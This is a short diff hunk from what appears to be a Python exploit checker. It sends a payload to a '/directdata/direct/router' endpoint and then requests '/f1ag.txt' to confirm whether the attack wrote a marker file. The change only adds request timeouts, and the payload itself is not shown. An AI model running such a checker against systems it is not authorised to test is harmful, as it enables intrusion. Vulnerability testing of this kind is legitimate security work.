@@ -48,9 +48,9 @@ def send_payload(url):
     try:
         print("[+]start scan......[+]")
 
-        r = requests.post(url + '/directdata/direct/router', data=payload,headers=headers,verify=False)
+        r = requests.post(url + '/directdata/direct/router', data=payload,headers=headers,timeout=6,verify=False)
     
-        r = requests.get(url + '/f1ag.txt',verify=False)
+        r = requests.get(url + '/f1ag.txt',timeout=6,verify=False)
 
         if "1" in r.text:
 
